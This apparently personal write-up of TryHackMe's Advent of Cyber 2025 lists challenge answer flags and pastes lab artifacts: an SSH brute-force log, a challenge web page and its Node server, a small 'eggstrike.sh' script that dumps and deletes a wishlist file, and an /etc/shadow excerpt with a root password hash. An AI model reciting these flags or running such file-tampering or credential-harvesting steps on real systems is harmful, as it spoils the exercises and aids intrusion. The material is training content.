# AOC (TryHackMe) 2025 (Advent of Cyber)

### Introduction

```markdown
The snow has started falling in Wareville, home of The Best Festival Company (TBFC). The team is preparing for SOCMAS, the annual cyber celebration, but something’s not right. Systems are glitching, passwords are failing, and McSkidy suspects something is afoot. This name keeps coming up: _King Malhare_. What could it mean?

How it Works
To start each challenge, click the “View Site” button in the top-right corner of the task page. You’ll need to press this button again for every new task, as each one loads its own challenge site. Once clicked, the room will open in a split-screen view, letting you follow the instructions on the left while interacting with the challenge on the right. This is where you’ll complete all of our interactive challenges to get you ready for this year's event!
```


## Flags:

### Advent of Cyber Prep Track

#### Challenge 1 - Password Pandemonium

Honestly just mashed some letters...

Flag: `THM{StrongStart}`

#### Challenge 2 - The suspicious Chocolate.exe

...

Flag: `THM{NotSoSweet}`

#### Challenge 3 - Welcome to the AttackBox!

...

Flag: `THM{Ready2Hack}`

#### Challenge 4 - The CMD Conundrum

...

Flag: `THM{WhereIsMcSkidy}`

#### Challenge 5 - Linux Lore

...

Flag: `THM{TrustNoBunny}`

#### Challenge 6 - The Leak in the List

...

Flag: `THM{LeakedAndFound}`

#### Challenge 7 - WiFi Woes in Wareville 

...

Flag: `THM{NoMoreDefault}`

#### Challenge 8 - The App Trap

...

Flag: `THM{AppTrapped}`

#### Challenge 9 - The Chatbot Confession

...

Flag: `THM{DontFeedTheBot}`

#### Challenge 10 - The Bunny's Browser Trial

...

Flag: `THM{EastmasIsComing}`

### Linux CLI - Shells Bells

#### Failed Password Attempts - `/var/auth.log`

```TXT
2025-10-13T01:43:48.000724+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:43:52.044888+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:43:55.543374+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:45:08.123120+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:45:11.440030+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:46:01.816094+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:46:07.558636+00:00 tbfc-web01 sshd[2453]: Failed password for socmas from eggbox-196.hopsec.thm port 14040 ssh2
2025-10-13T01:46:15.878653+00:00 tbfc-web01 sshd[2453]: message repeated 2 times: [ Failed password for socmas from eggbox-196.hopsec.thm port 14040 ssh2]
2025-11-30T20:58:06.889989+00:00 tbfc-web01 sshd[5139]: Failed password for invalid user app from 129.212.178.137 port 51356 ssh2
2025-11-30T20:58:10.335294+00:00 tbfc-web01 sshd[5141]: Failed password for invalid user basit from 129.212.178.137 port 51364 ssh2
2025-11-30T20:58:14.320761+00:00 tbfc-web01 sshd[5144]: Failed password for invalid user stream from 129.212.178.137 port 51378 ssh2
2025-11-30T20:58:18.220665+00:00 tbfc-web01 sshd[5146]: Failed password for invalid user elasticsearch from 129.212.178.137 port 56084 ssh2
2025-11-30T20:58:21.298032+00:00 tbfc-web01 sshd[5148]: Failed password for invalid user neo4j from 129.212.178.137 port 56100 ssh2
2025-11-30T20:58:24.597374+00:00 tbfc-web01 sshd[5150]: Failed password for invalid user test from 129.212.178.137 port 56104 ssh2
2025-11-30T20:58:28.299687+00:00 tbfc-web01 sshd[5152]: Failed password for invalid user devadmin from 129.212.178.137 port 33556 ssh2
2025-11-30T20:58:31.885127+00:00 tbfc-web01 sshd[5154]: Failed password for invalid user server from 129.212.178.137 port 33566 ssh2
2025-11-30T20:58:35.519410+00:00 tbfc-web01 sshd[5156]: Failed password for invalid user steam from 129.212.178.137 port 33580 ssh2
2025-11-30T20:58:38.806596+00:00 tbfc-web01 sshd[5159]: Failed password for invalid user mysql from 129.212.178.137 port 53582 ssh2
2025-11-30T20:58:42.453046+00:00 tbfc-web01 sshd[5161]: Failed password for invalid user arpwatch from 129.212.178.137 port 53626 ssh2
2025-11-30T20:58:45.351961+00:00 tbfc-web01 sshd[5163]: Failed password for list from 129.212.178.137 port 53660 ssh2
2025-11-30T20:58:49.387833+00:00 tbfc-web01 sshd[5165]: Failed password for invalid user user from 129.212.178.137 port 55832 ssh2
2025-11-30T20:58:52.873579+00:00 tbfc-web01 sshd[5167]: Failed password for root from 129.212.178.137 port 55838 ssh2
2025-11-30T20:58:56.147348+00:00 tbfc-web01 sshd[5169]: Failed password for invalid user odoo18 from 129.212.178.137 port 55842 ssh2
2025-11-30T20:58:59.746285+00:00 tbfc-web01 sshd[5171]: Failed password for invalid user user2 from 129.212.178.137 port 34298 ssh2
2025-11-30T20:59:02.673162+00:00 tbfc-web01 sshd[5173]: Failed password for invalid user grml from 129.212.178.137 port 34310 ssh2
2025-11-30T20:59:06.328718+00:00 tbfc-web01 sshd[5175]: Failed password for invalid user dolphinscheduler from 129.212.178.137 port 38378 ssh2
2025-11-30T20:59:09.628018+00:00 tbfc-web01 sshd[5177]: Failed password for invalid user almalinux from 129.212.178.137 port 38398 ssh2
2025-11-30T20:59:13.000954+00:00 tbfc-web01 sshd[5179]: Failed password for invalid user ciuser from 129.212.178.137 port 38438 ssh2
2025-11-30T20:59:16.985090+00:00 tbfc-web01 sshd[5181]: Failed password for invalid user test2 from 129.212.178.137 port 55808 ssh2
2025-11-30T20:59:20.998088+00:00 tbfc-web01 sshd[5183]: Failed password for invalid user tom from 129.212.178.137 port 55810 ssh2
2025-11-30T20:59:23.811165+00:00 tbfc-web01 sshd[5185]: Failed password for invalid user user from 129.212.178.137 port 55826 ssh2
2025-11-30T20:59:27.432206+00:00 tbfc-web01 sshd[5187]: Failed password for invalid user gitlab from 129.212.178.137 port 48142 ssh2
2025-11-30T20:59:31.354838+00:00 tbfc-web01 sshd[5189]: Failed password for invalid user flask from 129.212.178.137 port 48154 ssh2
2025-11-30T20:59:34.472087+00:00 tbfc-web01 sshd[5191]: Failed password for root from 129.212.178.137 port 48162 ssh2
2025-11-30T20:59:37.332273+00:00 tbfc-web01 sshd[5193]: Failed password for invalid user debian from 129.212.178.137 port 51136 ssh2
2025-11-30T20:59:41.814332+00:00 tbfc-web01 sshd[5195]: Failed password for invalid user priyanka from 129.212.178.137 port 51148 ssh2
2025-11-30T20:59:45.091916+00:00 tbfc-web01 sshd[5197]: Failed password for root from 129.212.178.137 port 51150 ssh2
2025-11-30T20:59:48.447401+00:00 tbfc-web01 sshd[5199]: Failed password for root from 129.212.178.137 port 55248 ssh2
2025-11-30T20:59:51.543542+00:00 tbfc-web01 sshd[5201]: Failed password for man from 129.212.178.137 port 55258 ssh2
2025-11-30T20:59:55.551327+00:00 tbfc-web01 sshd[5203]: Failed password for invalid user esuser from 129.212.178.137 port 55274 ssh2
2025-11-30T20:59:58.097519+00:00 tbfc-web01 sshd[5205]: Failed password for invalid user redis from 129.212.178.137 port 42116 ssh2
2025-11-30T21:00:02.741244+00:00 tbfc-web01 sshd[5207]: Failed password for invalid user emregover from 129.212.178.137 port 42130 ssh2
2025-11-30T21:00:05.986970+00:00 tbfc-web01 sshd[5210]: Failed password for invalid user cloudendure from 129.212.178.137 port 42146 ssh2
2025-11-30T21:00:08.921658+00:00 tbfc-web01 sshd[5212]: Failed password for root from 129.212.178.137 port 59028 ssh2
2025-11-30T21:00:12.591130+00:00 tbfc-web01 sshd[5214]: Failed password for invalid user cbm from 129.212.178.137 port 59040 ssh2
2025-11-30T21:00:15.780362+00:00 tbfc-web01 sshd[5216]: Failed password for invalid user argebarikat from 129.212.178.137 port 59046 ssh2
2025-11-30T21:00:19.037057+00:00 tbfc-web01 sshd[5218]: Failed password for invalid user init from 129.212.178.137 port 51596 ssh2
2025-11-30T21:00:22.274139+00:00 tbfc-web01 sshd[5220]: Failed password for root from 129.212.178.137 port 51608 ssh2
2025-11-30T21:00:26.537637+00:00 tbfc-web01 sshd[5222]: Failed password for invalid user postgresql from 129.212.178.137 port 45796 ssh2
2025-11-30T21:00:29.769575+00:00 tbfc-web01 sshd[5224]: Failed password for invalid user nexus from 129.212.178.137 port 45802 ssh2
2025-11-30T21:00:32.802714+00:00 tbfc-web01 sshd[5226]: Failed password for root from 129.212.178.137 port 45808 ssh2
2025-11-30T21:00:37.011155+00:00 tbfc-web01 sshd[5228]: Failed password for root from 129.212.178.137 port 60224 ssh2
2025-11-30T21:00:40.080486+00:00 tbfc-web01 sshd[5230]: Failed password for invalid user vmail from 129.212.178.137 port 60236 ssh2
2025-11-30T21:00:43.841372+00:00 tbfc-web01 sshd[5232]: Failed password for games from 129.212.178.137 port 60250 ssh2
2025-11-30T21:00:46.349317+00:00 tbfc-web01 sshd[5234]: Failed password for invalid user downloader from 129.212.178.137 port 40404 ssh2
2025-11-30T21:00:50.641233+00:00 tbfc-web01 sshd[5236]: Failed password for invalid user yarn from 129.212.178.137 port 40416 ssh2
2025-11-30T21:00:53.533311+00:00 tbfc-web01 sshd[5238]: Failed password for invalid user srikanth from 129.212.178.137 port 40426 ssh2
2025-11-30T21:00:56.488910+00:00 tbfc-web01 sshd[5240]: Failed password for invalid user jyvtc from 129.212.178.137 port 41602 ssh2
2025-11-30T21:01:00.973715+00:00 tbfc-web01 sshd[5242]: Failed password for invalid user sysadmin from 129.212.178.137 port 41604 ssh2
2025-11-30T21:01:03.715791+00:00 tbfc-web01 sshd[5244]: Failed password for invalid user default from 129.212.178.137 port 41606 ssh2
2025-11-30T21:01:07.361691+00:00 tbfc-web01 sshd[5246]: Failed password for invalid user testuser1 from 129.212.178.137 port 50974 ssh2
2025-11-30T21:01:10.600178+00:00 tbfc-web01 sshd[5248]: Failed password for invalid user sadmin from 129.212.178.137 port 50982 ssh2
2025-11-30T21:01:14.618853+00:00 tbfc-web01 sshd[5250]: Failed password for invalid user jumpserver from 129.212.178.137 port 50990 ssh2
2025-11-30T21:01:17.767418+00:00 tbfc-web01 sshd[5252]: Failed password for invalid user user from 129.212.178.137 port 39092 ssh2
2025-11-30T21:01:20.303170+00:00 tbfc-web01 sshd[5254]: Failed password for invalid user hysteria from 129.212.178.137 port 39098 ssh2
2025-11-30T21:01:24.796094+00:00 tbfc-web01 sshd[5256]: Failed password for invalid user oracle from 129.212.178.137 port 39106 ssh2
2025-11-30T21:01:27.596932+00:00 tbfc-web01 sshd[5258]: Failed password for invalid user amrita from 129.212.178.137 port 42490 ssh2
2025-11-30T21:01:31.227339+00:00 tbfc-web01 sshd[5260]: Failed password for ubuntu from 129.212.178.137 port 42500 ssh2
2025-11-30T21:01:34.380457+00:00 tbfc-web01 sshd[5262]: Failed password for invalid user systemx from 129.212.178.137 port 42510 ssh2
2025-11-30T21:01:38.408223+00:00 tbfc-web01 sshd[5264]: Failed password for invalid user appuser from 129.212.178.137 port 51986 ssh2
2025-11-30T21:01:41.626073+00:00 tbfc-web01 sshd[5266]: Failed password for root from 129.212.178.137 port 52006 ssh2
2025-11-30T21:01:44.601581+00:00 tbfc-web01 sshd[5268]: Failed password for invalid user cseadmin from 129.212.178.137 port 52024 ssh2
2025-11-30T21:01:48.863300+00:00 tbfc-web01 sshd[5270]: Failed password for root from 129.212.178.137 port 43864 ssh2
2025-11-30T21:01:51.260264+00:00 tbfc-web01 sshd[5272]: Failed password for mail from 129.212.178.137 port 43874 ssh2
2025-11-30T21:01:55.618109+00:00 tbfc-web01 sshd[5274]: Failed password for invalid user deployer from 129.212.178.137 port 43878 ssh2
2025-11-30T21:01:58.381260+00:00 tbfc-web01 sshd[5276]: Failed password for invalid user yealink from 129.212.178.137 port 52840 ssh2
2025-11-30T21:02:02.304840+00:00 tbfc-web01 sshd[5278]: Failed password for invalid user www from 129.212.178.137 port 52852 ssh2
2025-11-30T21:02:05.545169+00:00 tbfc-web01 sshd[5280]: Failed password for root from 129.212.178.137 port 52868 ssh2
2025-11-30T21:02:09.000307+00:00 tbfc-web01 sshd[5282]: Failed password for invalid user ftp from 129.212.178.137 port 49790 ssh2
2025-11-30T21:02:12.927187+00:00 tbfc-web01 sshd[5284]: Failed password for root from 129.212.178.137 port 49794 ssh2
2025-11-30T21:02:26.877175+00:00 tbfc-web01 sshd[5286]: Failed password for invalid user admin from 129.212.178.137 port 44128 ssh2
2025-11-30T21:02:29.532673+00:00 tbfc-web01 sshd[5288]: Failed password for root from 129.212.178.137 port 44140 ssh2
2025-11-30T21:02:39.977795+00:00 tbfc-web01 sshd[5290]: Failed password for invalid user username from 129.212.178.137 port 57234 ssh2
2025-11-30T21:02:44.192664+00:00 tbfc-web01 sshd[5292]: Failed password for invalid user applmgr from 129.212.178.137 port 57242 ssh2
2025-11-30T21:02:50.968461+00:00 tbfc-web01 sshd[5294]: Failed password for invalid user sem8 from 129.212.178.137 port 40278 ssh2
2025-11-30T21:03:04.033198+00:00 tbfc-web01 sshd[5296]: Failed password for invalid user ssm-user from 129.212.178.137 port 47042 ssh2
2025-12-01T01:02:22.294202+00:00 tbfc-web01 sshd[5610]: Failed password for root from 64.227.66.216 port 42454 ssh2
2025-12-01T01:03:06.085796+00:00 tbfc-web01 sshd[5612]: Failed password for root from 64.227.66.216 port 58010 ssh2
2025-12-01T01:03:25.511251+00:00 tbfc-web01 sshd[5614]: Failed password for root from 52.173.163.34 port 3072 ssh2
2025-12-01T01:03:50.361805+00:00 tbfc-web01 sshd[5616]: Failed password for root from 64.227.66.216 port 49882 ssh2
2025-12-01T01:04:35.664812+00:00 tbfc-web01 sshd[5618]: Failed password for root from 64.227.66.216 port 43064 ssh2
2025-12-01T01:05:20.983594+00:00 tbfc-web01 sshd[5623]: Failed password for root from 64.227.66.216 port 45304 ssh2
2025-12-01T01:06:05.390889+00:00 tbfc-web01 sshd[5625]: Failed password for root from 64.227.66.216 port 48446 ssh2
2025-12-01T01:06:49.212630+00:00 tbfc-web01 sshd[5628]: Failed password for root from 64.227.66.216 port 37914 ssh2
2025-12-01T01:07:29.791080+00:00 tbfc-web01 sshd[5630]: Failed password for root from 64.227.66.216 port 41340 ssh2
2025-12-01T01:08:10.765175+00:00 tbfc-web01 sshd[5632]: Failed password for root from 64.227.66.216 port 56280 ssh2
2025-12-01T01:33:23.977684+00:00 tbfc-web01 sshd[5661]: Failed password for root from 52.173.163.34 port 3072 ssh2
2025-12-01T02:03:08.452232+00:00 tbfc-web01 sshd[5689]: Failed password for root from 52.173.163.34 port 3072 ssh2
2025-12-01T02:33:06.920343+00:00 tbfc-web01 sshd[5718]: Failed password for root from 52.173.163.34 port 3072 ssh2
2025-12-01T06:00:50.129285+00:00 tbfc-web01 sshd[5931]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T06:27:42.119116+00:00 tbfc-web01 sshd[6029]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T06:58:13.199662+00:00 tbfc-web01 sshd[6054]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T07:04:39.756083+00:00 tbfc-web01 sshd[6061]: Failed password for root from 20.109.38.177 port 22464 ssh2
2025-12-01T07:25:54.631075+00:00 tbfc-web01 sshd[6096]: Failed password for root from 20.109.38.177 port 22464 ssh2
2025-12-01T07:28:52.840467+00:00 tbfc-web01 sshd[6099]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T07:48:00.968054+00:00 tbfc-web01 sshd[6131]: Failed password for root from 20.109.38.177 port 22464 ssh2
2025-12-01T07:59:46.034833+00:00 tbfc-web01 sshd[6140]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T08:10:05.534478+00:00 tbfc-web01 sshd[6148]: Failed password for root from 20.109.38.177 port 22464 ssh2
2025-12-01T08:30:48.797415+00:00 tbfc-web01 sshd[6336]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T08:32:11.402400+00:00 tbfc-web01 sshd[6345]: Failed password for root from 20.109.38.177 port 22464 ssh2
```

#### index.html & secret-server.sj

```TXT
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Wareville’s Christmas Countdown</title>
    <style>
      :root { --fg:#fff; --bg1:#003366; --bg2:#001122; }
      html,body{height:100%;}
      body{
        font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
        color:var(--fg);
        margin:0;
        display:grid;
        place-items:center;
        text-align:center;
        overflow:hidden;
      }
      body::before{
        content:"";
        position:fixed;
        inset:0;
        background:linear-gradient(to bottom,var(--bg1),var(--bg2));
        z-index:-2;
        transition:filter .5s;
      }
      #bg{
        position:fixed;
        inset:0;
        width:100vw;
        height:100vh;
        z-index:-1;
        pointer-events:none;
      }
      .card{
        background:rgba(0,0,0,0.45);
        border:1px solid rgba(255,255,255,0.08);
        border-radius:16px;
        box-shadow:0 12px 32px rgba(0,0,0,0.45);
        padding:1.25rem 1.4rem;
        max-width:920px;
        margin:1rem;
        backdrop-filter:saturate(120%) blur(6px);
      }
      h1{font-size:2.3rem;margin:0.2em 0 0.1em;text-shadow:0 2px 8px rgba(0,0,0,0.6);}
      #countdown{font-size:1.25rem;margin-bottom:1.1em;text-shadow:0 2px 6px rgba(0,0,0,0.5);}
      h2{margin:0.2em 0 0.4em;font-weight:700;text-shadow:0 2px 6px rgba(0,0,0,0.5);}
      ul{list-style:none;padding:0;margin:0}
      li{font-size:1.05rem;padding:0.28em 0;text-shadow:0 2px 6px rgba(0,0,0,0.5)}
      body.easter::before{filter:hue-rotate(60deg) brightness(1.05)}
      body.easter h1::before{content:"🐰 ";}
      body.easter h1::after{content:" 🥚";}
      @keyframes glitch{
        0%{transform:translate(0) rotate(0);filter:hue-rotate(0) contrast(1)}
        20%{transform:translate(-4px,2px) rotate(-.15deg);filter:hue-rotate(90deg) contrast(1.4)}
        40%{transform:translate(3px,-2px) rotate(.15deg);filter:hue-rotate(180deg) contrast(1.3)}
        60%{transform:translate(-2px,3px) rotate(-.1deg);filter:hue-rotate(250deg) contrast(1.5)}
        80%{transform:translate(2px,-1px) rotate(.1deg);filter:hue-rotate(330deg) contrast(1.2)}
        100%{transform:translate(0) rotate(0);filter:hue-rotate(0) contrast(1)}
      }
      .glitch{animation:glitch .8s steps(2,end)}
      #congrats{
        margin-top:1rem;
        padding:0.6rem 1rem;
        border-radius:8px;
        background:rgba(255,255,255,0.06);
        display:inline-block;
      }

      /* --- Cipher box + copy button --- */
      #cipherWrap{
        display:none;
        margin-top:1rem;
        text-align:left;
      }
      #cipherWrap h3{
        margin:.4rem 0 .6rem;
        font-size:1.05rem;
        font-weight:600;
      }
      #cipherBox{
        width:100%;
        height:150px;
        border:1px solid rgba(255,255,255,0.15);
        border-radius:8px;
        background:rgba(0,0,0,0.35);
        padding:.6rem .7rem;
        box-sizing:border-box;
        color:#eaeaea;
        font-family:ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
        font-size:.9rem;
        line-height:1.2rem;
        white-space:pre;       /* no wrapping */
        overflow:auto;
      }
      #copyBtn{
        margin-top:.6rem;
        padding:.45rem .8rem;
        border-radius:8px;
        border:1px solid rgba(255,255,255,0.18);
        background:rgba(255,255,255,0.1);
        color:#fff;
        cursor:pointer;
      }
      #copyBtn:active{transform:translateY(1px)}
    </style>
  </head>

  <body>
    <canvas id="bg" aria-hidden="true"></canvas>

    <main class="card">
      <h1 id="title">
        Welcome to Wareville’s <span id="holiday">Christmas</span> Countdown 🎄
      </h1>

      <div id="countdown"></div>

      <h2 id="listHeader">
        🎁 This Year's Most Wishlisted <span id="listHoliday">Christmas</span> Items 🎁
      </h2>

      <ul id="wishlist">Loading wishlist...</ul>

      <div id="congrats" style="display:none"></div>

      <div id="cipherWrap">
        <h3>Gibberish message (copy and decode with your UNLOCK_KEY)</h3>
        <div id="cipherBox" aria-label="ciphertext" tabindex="0"></div>
        <button id="copyBtn" type="button">Copy to clipboard</button>
      </div>
    </main>

    <script>
      /* ---------- Countdown ---------- */
      function updateCountdown() {
        const tgt = new Date(new Date().getFullYear(), 11, 25),
          now = new Date(),
          d = tgt - now;
        const el = document.getElementById("countdown");
        if (d <= 0) {
          el.textContent = "🎉 Merry Christmas from Wareville! 🎉";
          return;
        }
        const D = Math.floor(d / (1000 * 60 * 60 * 24));
        const H = Math.floor((d / (1000 * 60 * 60)) % 24);
        const M = Math.floor((d / (1000 * 60)) % 60);
        const S = Math.floor((d / 1000) % 60);
        el.textContent = `${D}d ${H}h ${M}m ${S}s until Christmas!`;
      }
      setInterval(updateCountdown, 1000);
      updateCountdown();

      /* ---------- Wishlist Check & Secret Fetch (calls Node backend :8081 via CORS) ---------- */
      const wishEl = document.getElementById("wishlist"),
            congratsEl = document.getElementById("congrats"),
            cipherWrap = document.getElementById("cipherWrap"),
            cipherBox  = document.getElementById("cipherBox"),
            copyBtn    = document.getElementById("copyBtn");

      function normalizeLine(s) {
        return s
          .replace(/^\uFEFF/, "")
          .replace(/\u00a0/g, " ")
          .replace(/\s+/g, " ")
          .trim()
          .toLowerCase();
      }

      const cacheBuster = "?v=" + Date.now();

      fetch("wishlist.txt" + cacheBuster, { cache: "no-store" })
        .then((r) => r.text())
        .then(async (text) => {
          const lines = text.split(/\r?\n/).filter((l) => l.length > 0);
          wishEl.innerHTML = "";
          for (const L of lines) {
            const li = document.createElement("li");
            li.textContent = L;
            wishEl.appendChild(li);
          }
          if (!lines.length) return;

          // Ask authoritative server for the secret/ciphertext.
          try {
            const resp = await fetch(
              "http://" + location.hostname + ":8081/secret" + cacheBuster,
              { mode: "cors" }
            );
            if (!resp.ok) return;
            const json = await resp.json();
            if (json && json.ok && json.text) {
              // Show the ciphertext neatly and enable copy
              cipherWrap.style.display = "block";
              cipherBox.textContent = json.text;

              // Stop all glitching immediately on success
              stopGlitching();
            }
          } catch (e) {
            // ignore
          }
        })
        .catch(() => {
          wishEl.textContent = "Wishlist not available.";
        });

      copyBtn?.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(cipherBox.textContent || "");
          copyBtn.textContent = "Copied!";
          setTimeout(() => (copyBtn.textContent = "Copy to clipboard"), 1200);
        } catch {}
      });

      /* ---------- Snowfall / Easter Emoji Rain ---------- */
      const canvas = document.getElementById("bg"),
        ctx = canvas.getContext("2d");
      let W = 0, H = 0, RAF;
      const SNOW_MODE = 0, EGG_MODE = 1;
      let mode = SNOW_MODE, flakes = [];
      const FLAKE_COUNT_BASE = 90;

      function resize() {
        W = (canvas.width = innerWidth);
        H = (canvas.height = innerHeight);
        initFlakes();
      }
      window.addEventListener("resize", resize);
      resize();

      function rand(a, b) { return Math.random() * (b - a) + a; }

      function initFlakes() {
        const scale = Math.max(0.6, Math.min(1, (W * H) / (1280 * 720)));
        const count = Math.floor(FLAKE_COUNT_BASE * scale);
        flakes = new Array(count).fill(0).map(() => spawnFlake(true));
      }

      function spawnFlake(initial = false) {
        return {
          x: initial ? rand(0, W) : rand(0, W),
          y: initial ? rand(0, H) : -20,
          vy: rand(0.25, 0.6),
          vx: rand(-0.15, 0.25),
          ch: mode === EGG_MODE ? eggEmoji() : null,
          s: rand(1.5, 3.5),
        };
      }

      function eggEmoji() {
        const eggs = ["🥚", "🐰", "🐣", "🌸", "🥕", "💐", "🌷"];
        return eggs[(Math.random() * eggs.length) | 0];
      }

      function step() {
        ctx.clearRect(0, 0, W, H);
        for (const f of flakes) {
          f.x += f.vx;
          f.y += f.vy;
          if (f.y > H + 24 || f.x < -24 || f.x > W + 24) {
            const i = flakes.indexOf(f);
            flakes[i] = spawnFlake(false);
            continue;
          }
          if (mode === SNOW_MODE) {
            ctx.fillStyle = "rgba(255,255,255,0.9)";
            ctx.beginPath();
            ctx.arc(f.x, f.y, f.s, 0, Math.PI * 2);
            ctx.fill();
          } else {
            ctx.font = `${14}px serif`;
            ctx.fillText(f.ch, f.x, f.y);
          }
        }
        RAF = requestAnimationFrame(step);
      }
      RAF = requestAnimationFrame(step);

      /* ---------- Glitch ---------- */
      let glitchInterval = null;

      function startGlitching() {
        if (glitchInterval) return;
        glitchInterval = setInterval(() => {
          toEaster();
          setTimeout(() => { toChristmas(); }, 1000);
        }, 5000);
      }

      function stopGlitching() {
        if (glitchInterval) {
          clearInterval(glitchInterval);
          glitchInterval = null;
        }
        toChristmas();
      }

      function toEaster() {
        document.body.classList.add("easter", "glitch");
        document.getElementById("title").innerHTML =
          "Welcome to Wareville’s <span id='holiday'>Easter</span> Countdown 🐇";
        document.getElementById("listHoliday").textContent = "Easter";
        mode = EGG_MODE;
        initFlakes();
      }

      function toChristmas() {
        document.body.classList.remove("easter", "glitch");
        document.getElementById("title").innerHTML =
          "Welcome to Wareville’s <span id='holiday'>Christmas</span> Countdown 🎄";
        document.getElementById("listHoliday").textContent = "Christmas";
        mode = SNOW_MODE;
        initFlakes();
      }

      startGlitching();
    </script>
  </body>
</html>

root@tbfc-web01:/home/socmas/2025$ ls
eggstrike.sh  index.html  node_modules  package-lock.json  package.json  secret-server.js
root@tbfc-web01:/home/socmas/2025$ cat secret-server.js 
const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 8081;
const ROOT = path.resolve(__dirname); // serves ./ (index.html etc)

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

const SECRET_HASH_B64 = 'ht9pdX84lhG4Hg9IMkVreVU8VDE+6pqSa/eecOukI98=';

const CIPHER_B64 = 'U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=';

// ---- helpers ----
function normalizeLine(s){
  if (!s) return '';
  return s.replace(/^\uFEFF/,'')       // remove BOM
          .replace(/\u00a0/g,' ')      // NBSP -> space
          .replace(/\s+/g,' ')         // collapse whitespace
          .trim()
          .toLowerCase();
}
function sha256base64(s){
  return crypto.createHash('sha256').update(s, 'utf8').digest('base64');
}

// Serve static files from this directory (index.html, wishlist.txt)
app.use(express.static(ROOT, { index: 'index.html' }));

// /secret endpoint -- authoritative check and returns ciphertext on success
app.get('/secret', (req, res) => {
  try {
    const wlPath = path.join(ROOT, 'wishlist.txt');
    if (!fs.existsSync(wlPath)) return res.status(404).json({ ok: false, error: 'no wishlist' });

    const txt = fs.readFileSync(wlPath, 'utf8');
    const lines = txt.split(/\r?\n/).filter(Boolean);
    if (!lines.length) return res.status(404).json({ ok: false, error: 'empty wishlist' });

    const firstNorm = normalizeLine(lines[0]);
    const h = sha256base64(firstNorm);

    let ok = (h === SECRET_HASH_B64);

    const W = ['hardware','security','keys','yubikey','similar'];
    if (!ok) {
      const pat = new RegExp(`${W[0]}\\s+${W[1]}\\s+${W[2]}.*\\(${W[3]}\\s+or\\s+${W[4]}\\)`, 'i');
      ok = pat.test(firstNorm);
    }

    if (!ok) return res.status(403).json({ ok: false, error: 'not permitted' });

    // Success: return the ciphertext blob; the page will display it verbatim
    return res.json({ ok: true, text: CIPHER_B64 });
  } catch (err) {
    console.error('secret error', err);
    return res.status(500).json({ ok: false, error: 'server error' });
  }
});

// start
app.listen(PORT, '0.0.0.0', () => {
  console.log(`secret server listening on ${PORT} (serving ${ROOT})`);
});
```

#### eggstrike.sh 

```bash
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
```

Flag: `THM{sir-carrotbane-attacks}`

#### Guides - `/home/mcskidy/Guides/.guide.txt`

Flag: `THM{learning-linux-cli}`

#### etc/shadow

```markdown
root:$y$j9T$g08hF7YiJUs.QtjFVmNcm/$CKUoUQzkr6aLTud5qWCw7TcYN61Ae/3VLo2hCJd/PS/:19999:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
